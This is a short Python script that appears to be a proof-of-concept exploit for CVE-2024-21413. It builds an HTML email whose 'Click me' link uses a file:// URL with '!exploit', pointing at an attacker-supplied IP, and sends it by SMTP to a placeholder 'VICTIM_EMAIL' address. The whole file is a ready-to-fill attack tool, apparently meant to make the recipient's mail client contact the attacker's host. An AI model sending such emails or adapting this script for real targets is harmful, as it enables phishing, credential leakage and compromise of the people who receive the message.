import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = '[YOUR_EMAIL]'  # Replace with your sender email address
receiver_email = '[VICTIM_EMAIL]'  # Replace with the recipient email address
password = '[YOUR_EMAIL_PASSWORD]'  # Replace with your email password
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://[UR IP]/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('SaintsConnor', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

try:
    server = smtplib.SMTP('MAILSERVER', [SERVER PORT])
    server.ehlo()
    server.starttls()  # Use TLS encryption
    server.login(sender_email, password)

    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
